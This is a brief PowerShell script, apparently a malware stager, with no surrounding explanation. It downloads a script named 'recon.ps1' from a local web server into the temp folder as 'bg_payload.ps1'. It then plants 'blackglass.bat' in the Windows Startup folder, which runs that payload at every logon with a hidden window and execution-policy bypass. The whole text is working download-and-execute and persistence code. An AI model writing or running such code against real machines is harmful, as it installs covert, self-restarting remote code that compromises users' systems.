$batPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\blackglass.bat"
$psPath = "$env:TEMP\\bg_payload.ps1"
$payloadUrl = "http://127.0.0.1:8000/recon.ps1"
Invoke-WebRequest -Uri $payloadUrl -OutFile $psPath
Set-Content -Path $batPath -Value "powershell -w hidden -exec bypass -File `"$psPath`""
